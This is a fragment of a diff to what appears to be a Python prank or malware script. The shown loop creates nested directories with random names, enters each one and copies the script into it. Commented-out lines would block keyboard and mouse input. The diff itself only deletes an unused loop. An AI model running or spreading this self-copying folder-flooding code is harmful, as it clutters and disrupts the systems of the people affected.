@@ -39,8 +39,6 @@ while count < 100:
     #    keyboard.block_key(i)
     #windll.user32.BlockInput(True) #fuck wi
     name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
-    for i in os.listdir():
-        name2 = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
     os.mkdir(name)
     os.chdir(name)
     shutil.copy(f"../{sys.argv[0]}", os.getcwd())
